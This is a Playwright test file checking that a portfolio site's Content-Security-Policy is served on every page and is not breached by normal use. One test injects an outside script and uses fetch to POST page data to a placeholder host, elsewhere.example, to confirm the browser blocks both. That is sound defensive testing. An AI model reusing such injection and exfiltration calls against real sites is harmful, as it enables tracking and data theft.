// The Content-Security-Policy (tracker B11). `npm run preview` serves the test build with the headers of
// public/_headers (vite.config.js), so these tests, and every other browser test, run under the policy of the live
// site.
import fs from 'node:fs';
import { expect, test } from '@playwright/test';

const projects = fs
  .readdirSync('content/projects')
  .filter((name) => name.endsWith('.json'))
  .map((name) => JSON.parse(fs.readFileSync(`content/projects/${name}`, 'utf8')))
  .filter((project) => project.draft !== true);

const PAGES = ['/', '/work/', ...projects.map((project) => `/work/${project.slug}/`), '/work/no-such-project/'];

/** The policy as public/_headers writes it, for every file of the site. */
const POLICY = (() => {
  const line = fs
    .readFileSync('public/_headers', 'utf8')
    .split('\n')
    .find((text) => text.trim().startsWith('Content-Security-Policy:'));
  return line ? line.trim().slice('Content-Security-Policy:'.length).trim() : null;
})();

/** Writes down every breach of the policy on the pages the tab opens, from the first byte of each page. */
async function watchPolicy(page) {
  await page.addInitScript(() => {
    window.__breaches = [];
    document.addEventListener('securitypolicyviolation', (event) => {
      window.__breaches.push(`${event.effectiveDirective}: ${event.blockedURI || 'inline'}${event.sample ? ` "${event.sample}"` : ''}`);
    });
  });
}

const breaches = (page) => page.evaluate(() => window.__breaches);

/** Waits until React runs the page: some breaches (and the palette) only come with its code. */
async function open(page, address) {
  await page.goto(address);
  await page.waitForFunction(() => Object.keys(document.getElementById('root')).some((key) => key.startsWith('__reactContainer')));
}

test('every page comes with the Content-Security-Policy of public/_headers', async ({ page }) => {
  expect(POLICY, 'public/_headers has a Content-Security-Policy').toBeTruthy();
  for (const address of PAGES) {
    const response = await page.goto(address);
    expect(response.headers()['content-security-policy'], address).toBe(POLICY);
  }
});

test('a script, a stylesheet or a connection the site did not write is refused', async ({ page }) => {
  // Another server that would answer: without the policy, each of these would load or run.
  await page.route('https://elsewhere.example/**', (route) => {
    const url = route.request().url();
    if (url.endsWith('.js')) return route.fulfill({ contentType: 'text/javascript', body: 'window.__fromElsewhere = true;' });
    if (url.endsWith('.css')) return route.fulfill({ contentType: 'text/css', body: 'body { text-decoration-line: line-through; }' });
    return route.fulfill({ status: 200, contentType: 'text/plain', headers: { 'Access-Control-Allow-Origin': '*' }, body: 'got it' });
  });
  await watchPolicy(page);
  await open(page, '/');

  const outcome = await page.evaluate(async () => {
    const add = (element) => new Promise((resolve) => {
      element.onload = () => resolve('loaded');
      element.onerror = () => resolve('refused');
      document.head.append(element);
      // An inline script or style has no load event: give it a moment, then look at what it did.
      if (!element.src && !element.href) setTimeout(() => resolve('added'), 100);
    });
    const inline = document.createElement('script');
    inline.textContent = 'window.__inline = true;';
    await add(inline);
    const outside = document.createElement('script');
    outside.src = 'https://elsewhere.example/tracker.js';
    await add(outside);
    const block = document.createElement('style');
    block.textContent = 'body { outline-style: dashed; }';
    await add(block);
    const sheet = document.createElement('link');
    sheet.rel = 'stylesheet';
    sheet.href = 'https://elsewhere.example/look.css';
    await add(sheet);
    let sent = 'sent';
    try {
      await fetch('https://elsewhere.example/collect', { method: 'POST', body: 'the page' });
    } catch {
      sent = 'refused';
    }
    return {
      inlineScript: window.__inline === true,
      outsideScript: window.__fromElsewhere === true,
      styleBlock: getComputedStyle(document.body).outlineStyle,
      outsideSheet: getComputedStyle(document.body).textDecorationLine,
      sent,
    };
  });
  expect(outcome).toEqual({ inlineScript: false, outsideScript: false, styleBlock: 'none', outsideSheet: 'none', sent: 'refused' });
  const found = await breaches(page);
  for (const directive of ['script-src-elem', 'style-src-elem', 'connect-src']) {
    expect(found.some((line) => line.startsWith(`${directive}:`)), `a breach of ${directive} in ${JSON.stringify(found)}`).toBe(true);
  }
});

test('every page, the palette, the theme and the contact form keep to the policy', async ({ page }) => {
  test.setTimeout(90_000);
  await page.route('**/api.emailjs.com/**', (route) => route.fulfill({ status: 200, contentType: 'text/plain', body: 'OK' }));
  await watchPolicy(page);

  for (const address of PAGES) {
    await open(page, address);
    // The theme script of index.html ran before the first paint.
    await expect(page.locator('html'), address).toHaveAttribute('data-theme', /^(light|dark)$/);
    // Down the whole page, so every picture loads and every block below the first screen comes into view.
    await page.evaluate(async () => {
      for (let y = 0; y < document.documentElement.scrollHeight; y += window.innerHeight * 0.75) {
        window.scrollTo(0, y);
        await new Promise((resolve) => setTimeout(resolve, 60));
      }
    });
    expect(await breaches(page), address).toEqual([]);
  }

  await open(page, '/');
  const before = await page.locator('html').getAttribute('data-theme');
  await page.getByRole('button', { name: 'Search' }).click();
  const palette = page.getByRole('dialog', { name: 'Search the site' });
  await expect(palette).toBeVisible();
  await page.getByRole('combobox').fill('theme');
  await page.keyboard.press('Enter');
  await expect(page.locator('html')).not.toHaveAttribute('data-theme', before);

  await page.getByLabel(/name/i).fill('Sara Ali');
  await page.getByLabel(/email/i).fill('sara@example.com');
  await page.getByLabel(/message/i).fill('Hello, I have a project for you.');
  await page.locator('#contact form button[type="submit"]').click();
  await expect(page.locator('#contact [role="status"]')).toContainText(/on its way|sent|thank you/i);
  expect(await breaches(page)).toEqual([]);
});
